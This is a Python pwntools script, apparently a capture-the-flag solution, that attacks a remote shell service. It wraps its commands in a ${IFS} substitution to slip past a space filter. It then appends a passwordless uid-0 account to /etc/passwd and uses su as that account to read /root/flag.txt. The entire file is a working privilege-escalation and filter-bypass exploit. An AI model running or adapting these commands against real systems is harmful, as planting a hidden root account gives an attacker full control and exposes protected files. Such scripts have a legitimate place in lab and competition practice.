#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        print("[!] Remote server not specified!")
        exit()

# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
io = start()

def bypass(cmd: str):
    return cmd.replace(" ", "${IFS}")

io.sendlineafter("$", bypass("echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd"))
io.sendlineafter("$", bypass("su - dummy -c \"cat</root/flag.txt\""))
flag = io.recvlineS().strip()
success(flag)